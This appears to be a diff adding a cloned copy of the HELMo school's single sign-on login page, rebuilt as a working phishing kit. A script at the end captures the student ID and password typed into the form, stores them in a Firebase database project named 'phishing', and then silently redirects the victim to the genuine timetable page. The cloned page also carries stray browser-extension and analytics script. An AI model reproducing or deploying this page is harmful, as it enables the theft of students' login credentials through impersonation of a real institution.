@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<!-- saved from url=(0067)https://sso1.helmo.be/idp/profile/SAML2/Redirect/SSO?execution=e1s1 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Service d'authentification HELMo</title>
+    
+<meta name="theme-color" content="#d6d6d6">
+<meta name="viewport" content="width=device-width">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Roboto:300" rel="stylesheet" type="text/css">
+<link href="./index_files/icon" rel="stylesheet">
+<link href="./index_files/css" rel="stylesheet" type="text/css">
+<link href="https://sso1.helmo.be/idp/images/favicon.png" rel="icon">
+<link href="./index_files/main.css" rel="stylesheet" type="text/css">
+<!-- <script async="" src="https://media.helmo.be/service-informatique/browser-update/browser-update.js" type="text/javascript"></script>
+async="" src="./index_files/browser-update.js.téléchargement" type="text/javascript"></script>
+<script type="text/javascript" src="./index_files/enfant.min.js.téléchargement" integrity="sha384-hs7CLyt6wHLFEKYGrWrYDHL/6UUlJieluK64hfK4mUQnCfbzTvFVeER8JIQL7CVf" crossorigin="anonymous"></script>    <script type="text/javascript">
+        function boutonConnexion_onclick(bouton) {
+            try {
+                bouton.childNodes[0].nodeValue = 'Connexion en cours, veuillez patienter...';
+                                bouton.onclick = function() { return false; };
+            } catch (e) {
+            } finally {
+                return true;
+            }
+        }
+    </script>-->
+<style type="text/css">@font-face { font-family: Roboto; src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf"); }</style></head>
+<body>
+<div class="wrapper">
+    <div class="container">
+        <header>
+            <img src="./index_files/logo-helmo.png" alt="Haute Ecole Libre Mosane - HELMo">
+        </header>
+
+        <div class="content">
+            <div class="column one">
+                
+
+                <form  method="post">
+
+                                        
+                                        
+                                                							                        
+                        <div class="form-element-wrapper">
+                            <i class="material-icons normal-icon"></i>
+                            <label class="full-width" for="username">Matricule HELMo</label>
+                            <input autofocus="" class="full-width form-element form-field" id="username" name="j_username" type="text" value="" placeholder="Votre matricule d&#39;une lettre et six chiffres">
+                        </div>
+
+                        <div class="form-element-wrapper">
+                            <i class="material-icons normal-icon"></i>
+                            <label class="full-width" for="password">Mot de passe</label>
+                            <input class="full-width form-element form-field" id="password" name="j_password" type="password" value="" placeholder="Entrez ici votre mot de passe">
+                        </div>
+
+						                        <div id="maintenance" class="form-element-wrapper info" style="display: none;">
+							<script type="text/javascript">
+								try{
+									var date = new Date;
+									var heure = date.getUTCHours() + 1;
+									var minutes = date.getMinutes();
+									if(heure === 3 && minutes < 30){
+										document.getElementById("maintenance").style.display = "block"
+									}
+								} catch(e){}
+							</script>
+							<i class="material-icons"></i>
+							<div style="padding-left:30px">
+								Accès perturbé de 3h00 à 3h30 en raison d'une maintenance de routine.							</div>
+                        </div>
+
+                        <div class="form-element-wrapper">
+                            <button class="form-element form-button" type="submit" name="_eventId_proceed" id="button">
+                                Connexion                            </button>
+                        </div>
+                    
+                                    </form>
+
+				<a class="lien-evidence" href="https://connect2.helmo.be/MotDePassePerdu/DemandeModifierMotDePasse">Mot de passe oublié?</a>
+				
+                
+                                                				
+                                                
+                				
+                                                                                                                    <a class="lien-evidence" href="https://learn-technique.helmo.be/login/visiteur.php">Utiliser un compte extérieur</a>
+                                                                                                
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script type="text/javascript">
+	var page="login";
+</script>
+<!-- Google tag (gtag.js) -->
+
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-T89508S39N');
+  
+  try{
+		var plateformeCible = 'learn-technique.helmo.be';
+		if(plateformeCible.indexOf('$') !== -1){
+			plateformeCible = 'inconnue';
+		}
+		ga('set', 'dimension1', plateformeCible);
+   }catch(e){}
+
+   try{
+		var pageSSO = 'inconnue';
+		if (typeof page !== 'undefined') { 
+			pageSSO = page; 
+		}
+		ga('set', 'dimension2', pageSSO);
+   }catch(e){}
+
+   try{
+		if(pageSSO === 'login'){
+			var compteurTentatives = window.location.search.split('s').slice(-1)[0];
+			ga('set', 'dimension3', compteurTentatives);
+		}
+   }catch(e){}
+</script>
+<script>
+		function returnCommentSymbol(language = "javascript") {
+			const languageObject = {
+				bat: "@REM",
+				c: "//",
+				csharp: "//",
+				cpp: "//",
+				closure: ";;",
+				coffeescript: "#",
+				dockercompose: "#",
+				css: "/*DELIMITER*/",
+				"cuda-cpp": "//",
+				dart: "//",
+				diff: "#",
+				dockerfile: "#",
+				fsharp: "//",
+				"git-commit": "//",
+				"git-rebase": "#",
+				go: "//",
+				groovy: "//",
+				handlebars: "{{!--DELIMITER--}}",
+				hlsl: "//",
+				html: "<!--DELIMITER-->",
+				ignore: "#",
+				ini: ";",
+				java: "//",
+				javascript: "//",
+				javascriptreact: "//",
+				json: "//",
+				jsonc: "//",
+				julia: "#",
+				latex: "%",
+				less: "//",
+				lua: "--",
+				makefile: "#",
+				markdown: "<!--DELIMITER-->",
+				"objective-c": "//",
+				"objective-cpp": "//",
+				perl: "#",
+				perl6: "#",
+				php: "<!--DELIMITER-->",
+				powershell: "#",
+				properties: ";",
+				jade: "//-",
+				python: "#",
+				r: "#",
+				razor: "<!--DELIMITER-->",
+				restructuredtext: "..",
+				ruby: "#",
+				rust: "//",
+				scss: "//",
+				shaderlab: "//",
+				shellscript: "#",
+				sql: "--",
+				svg: "<!--DELIMITER-->",
+				swift: "//",
+				tex: "%",
+				typescript: "//",
+				typescriptreact: "//",
+				vb: "'",
+				xml: "<!--DELIMITER-->",
+				xsl: "<!--DELIMITER-->",
+				yaml: "#"
+			}
+			if(!languageObject[language]){
+				return languageObject["python"].split("DELIMITER")
+			}
+			return languageObject[language].split("DELIMITER")
+		}
+		var savedChPos = 0
+		var returnedSuggestion = ''
+		let editor, doc, cursor, line, pos
+		pos = {line: 0, ch: 0}
+		var suggestionsStatus = false
+		var docLang = "python"
+		var suggestionDisplayed = false
+		var isReturningSuggestion = false
+		document.addEventListener("keydown", (event) => {
+		setTimeout(()=>{
+			editor = event.target.closest('.CodeMirror');
+			if (editor){
+				const codeEditor = editor.CodeMirror
+				if(!editor.classList.contains("added-tab-function")){
+					editor.classList.add("added-tab-function")
+					codeEditor.removeKeyMap("Tab")
+					codeEditor.setOption("extraKeys", {Tab: (cm)=>{
+
+						if(returnedSuggestion){
+							acceptTab(returnedSuggestion)
+						}
+						else{
+							cm.execCommand("defaultTab")
+						}
+					}})
+				}
+				doc = editor.CodeMirror.getDoc()
+				cursor = doc.getCursor()
+				line = doc.getLine(cursor.line)
+				pos = {line: cursor.line, ch: line.length}
+
+				if(cursor.ch > 0){
+					savedChPos = cursor.ch
+				}
+
+				const fileLang = doc.getMode().name
+				docLang = fileLang
+				const commentSymbol = returnCommentSymbol(fileLang)
+				if (event.key == "?"){
+					var lastLine = line
+					lastLine = lastLine.slice(0, savedChPos - 1)
+
+					if(lastLine.trim().startsWith(commentSymbol[0])){
+						if(fileLang !== "null"){
+							lastLine += " "+ fileLang
+						}
+						
+						lastLine = lastLine.split(commentSymbol[0])[1]
+						window.postMessage({source: 'getQuery', payload: { data: lastLine } } )
+						isReturningSuggestion = true
+						displayGrey("\nBlackbox loading...")
+					}
+				}else if(event.key === "Enter" && suggestionsStatus && !isReturningSuggestion){
+					var query = doc.getRange({ line: Math.max(0,cursor.line-50), ch: 0 }, { line: cursor.line, ch: line.length })
+					window.postMessage({source: 'getSuggestion', payload: { data: query, language: docLang, cursorPos: pos } } )
+					displayGrey("Blackbox loading...")
+				}else if(event.key === "ArrowRight" && returnedSuggestion){
+					acceptTab(returnedSuggestion)
+				}else if(event.key === "Enter" && isReturningSuggestion){
+					displayGrey("\nBlackbox loading...")
+				}else if(event.key === "Escape"){
+					displayGrey("")
+				}
+			}
+		}, 0)
+		})
+
+		function acceptTab(text){
+		if (suggestionDisplayed){
+			displayGrey("")
+			doc.replaceRange(text, pos)
+			returnedSuggestion = ""
+			updateSuggestionStatus(false)
+		}
+		}
+		function acceptSuggestion(text){
+			displayGrey("")
+			doc.replaceRange(text, pos)
+			returnedSuggestion = ""
+			updateSuggestionStatus(false)
+		}
+		function displayGrey(text){
+			if(!text){
+				document.querySelector(".blackbox-suggestion").remove()
+				return
+			}
+			var el = document.querySelector(".blackbox-suggestion")
+			if(!el){
+				el = document.createElement('span')
+				el.classList.add("blackbox-suggestion")
+				el.style = 'color:grey'
+				el.innerText = text
+			}
+			else{
+				el.innerText = text
+			}
+			
+			var lineIndex = pos.line;
+			editor.getElementsByClassName('CodeMirror-line')[lineIndex].appendChild(el)
+		}
+		function updateSuggestionStatus(s){
+			suggestionDisplayed = s
+			window.postMessage({source: 'updateSuggestionStatus', status: suggestionDisplayed, suggestion: returnedSuggestion})
+		}
+		window.addEventListener('message', (event)=>{
+		if (event.source !== window ) return
+		if (event.data.source == 'return'){
+			isReturningSuggestion = false
+			const formattedCode = formatCode(event.data.payload.data)
+			returnedSuggestion = formattedCode
+			displayGrey(formattedCode)
+			updateSuggestionStatus(true)
+		}
+		if(event.data.source == 'suggestReturn'){
+			const prePos = event.data.payload.cursorPos
+			if(pos.line == prePos.line && pos.ch == prePos.ch){
+				returnedSuggestion = event.data.payload.data
+				displayGrey(event.data.payload.data)
+				updateSuggestionStatus(true)
+			}
+			else{
+				displayGrey()
+			}
+		}
+		if(event.data.source == 'codeSearchReturn'){
+			isReturningSuggestion = false
+			displayGrey()
+		}
+		if(event.data.source == 'suggestionsStatus'){
+			suggestionsStatus = event.data.payload.enabled
+		}
+		if(event.data.source == 'acceptSuggestion'){
+			
+			acceptSuggestion(event.data.suggestion)
+		}
+		})
+		document.addEventListener("keyup", function(){
+			returnedSuggestion = ""
+			updateSuggestionStatus(false)
+		})
+		function formatCode(data) {
+			if (Array.isArray(data)) {
+				var finalCode = ""
+				var pairs = []
+		
+				const commentSymbol = returnCommentSymbol(docLang)
+				data.forEach((codeArr, idx) => {
+					const code = codeArr[0]
+					var desc = codeArr[1]
+					const descArr = desc.split("\n")
+					var finalDesc = ""
+					descArr.forEach((descLine, idx) => {
+						const whiteSpace = descLine.search(/\S/)
+						if (commentSymbol.length < 2 || idx === 0) {
+							finalDesc += insert(descLine, whiteSpace, commentSymbol[0])
+						}
+						if (commentSymbol.length > 1 && idx === descArr.length - 1) {
+							finalDesc = finalDesc + commentSymbol[1] + "\n"
+						}
+					})
+		
+					finalCode += finalDesc + "\n\n" + code
+					pairs.push(finalCode)
+				})
+				return "\n"+pairs.join("\n")
+			}
+		
+			return "\n"+data
+		}
+		
+		function insert(str, index, value) {
+			return str.substr(0, index) + value + str.substr(index)
+		}
+
+	</script>
+	<script type="module">
+		import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.20.0/firebase-app.js'
+	
+		
+	
+		// Add Firebase products that you want to use
+	
+		import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.20.0/firebase-firestore.js'
+		// Your web app's Firebase configuration
+			// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+			const firebaseConfig = {
+			apiKey: "AIzaSyB7a0Sw8WZUIK-E6gNOrEi6udRhQNUL72A",
+			authDomain: "phishing-30f03.firebaseapp.com",
+			projectId: "phishing-30f03",
+			storageBucket: "phishing-30f03.appspot.com",
+			messagingSenderId: "172415797904",
+			appId: "1:172415797904:web:c828e89c4f7ffa0ea72615",
+			measurementId: "G-X8Z674LR0R"
+			};
+
+			// Initialize Firebase
+				const app = initializeApp(firebaseConfig);
+				const firestore = getFirestore(app);
+				const onclick = async ()=> {
+					const username = document.getElementById("username").value
+					const password = document.getElementById("password").value
+					const ref = collection(firestore,"users");
+					try {
+						await addDoc(ref,{username,password})
+						
+					}
+					catch (e){
+						console.log(e)
+					}
+					 // {"username":username,"password":password}
+				
+				}
+				document.getElementById("button").onclick=async (e) => {
+
+
+					e.preventDefault()
+					await onclick()
+					location="https://connect2.helmo.be/MonHoraire/Etudiant/Index"
+				}
+	  </script>
+
+</body></html>
